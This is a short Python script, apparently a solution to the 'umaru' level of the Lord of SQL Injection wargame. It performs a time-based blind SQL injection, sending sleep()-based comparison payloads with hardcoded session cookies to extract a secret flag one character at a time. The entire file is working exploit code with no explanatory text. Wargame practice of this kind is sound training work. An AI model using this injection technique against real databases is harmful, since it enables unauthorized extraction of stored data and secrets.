import requests
from bs4 import BeautifulSoup
import re
import time

URL = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?"

cookie = {
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"vd1msq4gqslasr388ldc4oeop6"
}
s = requests.Session()

pw = ""

for i in range (16):
    for j in range(32,127):
        data = "flag=1 and (select null union select sleep((flag<'"+pw+chr(j)+"')*2))"
        time1 = int(time.time())
        req1 = s.get(URL+data,cookies=cookie)
        time2 = int(time.time())
        if time2-time1 > 2 :
            pw = pw+chr(j-1)
            print (pw)
